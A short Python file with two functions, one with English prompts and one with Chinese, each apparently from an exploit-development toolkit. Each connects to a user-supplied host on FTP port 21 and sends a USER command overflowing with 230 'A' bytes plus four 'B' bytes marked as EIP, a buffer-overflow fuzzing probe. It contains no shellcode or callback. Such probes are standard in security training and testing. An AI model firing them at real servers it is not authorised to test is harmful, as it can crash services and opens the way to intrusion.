def fuzzing4_e():
    import socket
    print ("Please enter target host!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        FUZZ = "A" * 230
        EIP = "B" * 4
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP.encode() + b"\r\n")
        s.close()
    else:
        print("Error!")
def fuzzing4_c():
    import socket
    print ("请输入目标主机IP!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        FUZZ = "A" * 230
        EIP = "B" * 4
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP.encode() + b"\r\n")
        s.close()
    else:
        print("错误!")